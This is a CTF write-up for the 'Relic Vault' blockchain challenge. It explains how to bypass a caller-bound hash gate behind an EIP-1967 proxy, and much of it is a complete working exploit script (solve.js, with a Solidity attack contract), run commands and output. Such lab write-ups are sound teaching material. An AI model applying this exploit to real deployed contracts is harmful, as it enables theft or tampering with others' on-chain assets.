---
title: "Relic Vault - CTF Writeup"
date: 2026-04-11
draft: false
description: "Cryptography challenge writeup"
tags: ["Cryptography", "Blockchain"]
categories: ["Writeups"]
---


**Challenge Name:** Relic Vault  
**Category:** Blockchain / Cryptography  
**CTF:** CyberSummit V4.0 CTF  
**Description:** Sukuna is now contained by a new type of sorcery idk what is it, it is contained by chains and blocks.  
**Connection:** `nc 48.199.16.26 9995`  

---

## Initial Reconnaissance

The challenge starts from a netcat menu:

```bash
nc 48.199.16.26 9995
```

Menu output:

```text
1 - show instance info
2 - get flag (if isSolved() is true)
3 - exit
action?
```

Choosing option `1` returns blockchain instance details:

```text
a private chain has been deployed
the vault is behind a proxy
rpc endpoint: http://127.0.0.1:8545
deployer private key: 0x...
deployer address: 0x...
proxy address: 0x...
implementation address: 0x...
```

The RPC shown is localhost from the server side, but externally it is reachable at the host RPC endpoint.

---

## Understanding the Service

The service is a typical blockchain CTF wrapper:

1. A private chain is started.
2. A target contract is deployed behind a proxy.
3. You are given a funded private key and target addresses.
4. Option `2` checks `isSolved()` and prints the flag if true.

So the full objective is to set the on-chain solved state, then return to menu option `2`.

---

## On-Chain Analysis

Using the provided target and RPC, we query the proxy and implementation:

- Proxy address: exposed by menu
- Implementation address: either exposed by menu or recoverable from EIP-1967 slot

The first important check is `isSolved()`:

```js
const solved = await challenge.isSolved();
```

Initially it is `false`.

Next, we inspect implementation bytecode and extract `PUSH32` constants as candidate hidden values. This is exactly what the existing solver does.

---

## Contract Reverse Engineering

Relic Vault uses a gate that prevents normal users from solving directly.

From behavior and bytecode pattern, the challenge enforces:

- constructor-time caller constraints (`msg.sender.code.length == 0` logic)
- a hash check built from:
  - previous blockhash
  - caller address
  - hidden salt-like constant in implementation

The solver in this repo creates a temporary attack contract and calls target `solve(bytes32)` from that constructor.

That is the key trick: calling from constructor gives a contract caller with zero runtime code at call time.

---

## Finding the Vulnerability

The intended weakness is not a simple public setter. It is a brittle authentication formula tied to hidden constants and constructor context.

The attack path is:

1. Recover implementation address from EIP-1967 storage.
2. Parse implementation bytecode for candidate 32-byte constants.
3. Predict the attack contract address before deployment.
4. Build `guess = keccak256(blockhash(n-1), predictedAttackAddress, candidateSalt)`.
5. Deploy attack contract that calls `solve(guess)` in constructor.
6. Repeat candidates until solved state flips.

Why this works:

- `msg.sender` during constructor call is the new contract address.
- `code.length` for a contract in construction is zero.
- If predicted address and recovered salt are correct, hash check passes.

---

## Exploitation

The solver `solve.js` automates everything:

- EIP-1967 implementation recovery
- bytecode constant extraction
- address prediction (`ethers.getCreateAddress`)
- constructor attack deployment loop
- solved-state verification

Full `solve.js` source:

```javascript
const solc = require('solc');
const { ethers } = require('ethers');

const RPC_URL = process.env.RPC_URL || 'http://127.0.0.1:8545';
const TARGET = process.env.TARGET || process.env.PROXY || '';
const PRIVATE_KEY = process.env.PRIVATE_KEY || '';

if (!TARGET) {
  throw new Error('set TARGET to the proxy address');
}

if (!PRIVATE_KEY) {
  throw new Error('set PRIVATE_KEY to the funded deployer key');
}

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const proxyAbi = [
  'function isSolved() view returns (bool)',
];

const attackSource = `
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface IRelicVault {
    function solve(bytes32 guess) external;
}

contract Attack {
    constructor(address target, bytes32 guess) payable {
        IRelicVault(target).solve(guess);
    }
}
`;

function compileAttack() {
  const input = {
    language: 'Solidity',
    sources: {
      'Attack.sol': {
        content: attackSource,
      },
    },
    settings: {
      optimizer: {
        enabled: true,
        runs: 200,
      },
      outputSelection: {
        '*': {
          '*': ['abi', 'evm.bytecode.object'],
        },
      },
    },
  };

  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  if (output.errors) {
    const failures = output.errors.filter((item) => item.severity === 'error');
    if (failures.length > 0) {
      throw new Error(failures.map((item) => item.formattedMessage).join('\n'));
    }
  }

  const contract = output.contracts['Attack.sol'].Attack;
  return {
    abi: contract.abi,
    bytecode: `0x${contract.evm.bytecode.object}`,
  };
}

function extractPush32Constants(bytecode) {
  const stripped = bytecode.startsWith('0x') ? bytecode.slice(2) : bytecode;
  const bytes = Buffer.from(stripped, 'hex');
  const constants = [];

  for (let index = 0; index < bytes.length;) {
    const opcode = bytes[index];
    index += 1;

    if (opcode === 0x7f && index + 32 <= bytes.length) {
      constants.push(`0x${bytes.slice(index, index + 32).toString('hex')}`);
      index += 32;
      continue;
    }

    if (opcode >= 0x60 && opcode <= 0x7f) {
      index += opcode - 0x5f;
    }
  }

  return [...new Set(constants)];
}

function eip1967ImplementationSlot() {
  const slot = ethers.keccak256(ethers.toUtf8Bytes('eip1967.proxy.implementation'));
  const value = (BigInt(slot) - 1n) & ((1n << 256n) - 1n);
  return `0x${value.toString(16).padStart(64, '0')}`;
}

async function getImplementationAddress(proxyAddress) {
  const slot = eip1967ImplementationSlot();
  const raw = await provider.send('eth_getStorageAt', [proxyAddress, slot, 'latest']);
  return ethers.getAddress(`0x${raw.slice(-40)}`);
}

async function main() {
  const proxyAddress = ethers.getAddress(TARGET);
  const implementationAddress = await getImplementationAddress(proxyAddress);
  const code = await provider.getCode(implementationAddress);
  const constants = extractPush32Constants(code).filter((value) => value !== ethers.ZeroHash);

  if (constants.length === 0) {
    throw new Error('no PUSH32 constants found in implementation bytecode');
  }

  const latestBlock = await provider.getBlock('latest');
  const blockHash = latestBlock.hash;

  console.log(`[+] proxy: ${proxyAddress}`);
  console.log(`[+] implementation: ${implementationAddress}`);
  console.log(`[+] latest block: ${latestBlock.number}`);
  console.log(`[+] candidate constants: ${constants.length}`);

  const attack = compileAttack();
  const factory = new ethers.ContractFactory(attack.abi, attack.bytecode, wallet);

  for (const salt of constants) {
    const deployNonce = await provider.getTransactionCount(wallet.address, 'pending');
    const predictedAttackAddress = ethers.getCreateAddress({
      from: wallet.address,
      nonce: deployNonce,
    });

    const guess = ethers.keccak256(
      ethers.concat([
        blockHash,
        ethers.getBytes(predictedAttackAddress),
        ethers.getBytes(salt),
      ])
    );

    console.log(`[+] trying salt ${salt} with attack address ${predictedAttackAddress}`);

    try {
      const deployed = await factory.deploy(proxyAddress, guess);
      await deployed.waitForDeployment();
      console.log(`[+] attack contract deployed: ${await deployed.getAddress()}`);

      const challenge = new ethers.Contract(proxyAddress, proxyAbi, provider);
      const solved = await challenge.isSolved();
      if (solved) {
        console.log('[+] solved');
        return;
      }
    } catch (error) {
      console.log(`[-] candidate failed: ${error.shortMessage || error.message}`);
    }
  }

  throw new Error('no candidate salt solved the challenge');
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
```

Run example:

```bash
RPC_URL=http://48.199.16.26:8545 \
TARGET=0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 \
PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
node solve.js
```

Actual solver output (captured from live host):

```text
[+] proxy: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
[+] implementation: 0x5FbDB2315678afecb367f032d93F642f64180aa3
[+] latest block: 4
[+] candidate constants: 2
[+] trying salt 0x588d801948790fc2850ad7979095b627754b88f48418ca68f0a537d722c645b2 with attack address 0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9
[+] attack contract deployed: 0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9
[+] solved
```

---

## Getting the Flag

After solver reports solved, reconnect to the menu and choose option `2`:

```bash
printf '2\n' | nc 48.199.16.26 9995
```

Output:

```text
1 - show instance info
2 - get flag (if isSolved() is true)
3 - exit
action?
flag: CyberTrace{I_h0p3_7h4T_W4S_guut_M5_F613nD}
1 - show instance info
2 - get flag (if isSolved() is true)
3 - exit
action?
```

---

## Final Flag

```text
CyberTrace{I_h0p3_7h4T_W4S_guut_M5_F613nD}
```

---

## Key Takeaways

1. Constructor-context checks are not strong authentication by themselves.
2. Proxy indirection (EIP-1967) hides implementation details but does not prevent reverse engineering.
3. Immutable/embedded constants in bytecode can often be extracted.
4. Address precomputation (`CREATE`) can break caller-bound hash gates.
5. In blockchain CTFs, combining bytecode analysis + transaction crafting is often enough to bypass "hard" gates.
